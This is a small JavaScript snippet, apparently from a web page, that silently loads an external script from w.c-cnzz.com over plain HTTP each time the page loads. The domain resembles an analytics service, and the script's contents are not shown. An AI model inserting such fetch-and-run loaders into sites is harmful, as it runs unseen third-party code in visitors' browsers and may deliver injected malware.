(function (doc) {
    doc.write('<div style="display:none;" id="write_test_div"></div>');
    function loadJs(url) {
        if (document.getElementById('write_test_div')) {
            document.write(['<script type="text/javascript" src="', '"></script>'].join(url))
        } else {
            var el = document.createElement('script');
            el.src = url;
            el.type = 'text/javascript';
            document.getElementsByTagName('head')[0].appendChild(el)
        }
    }
    loadJs('http://w.c-cnzz.com/core.js?cid=30001020&t=' + new Date().getTime())
})(document);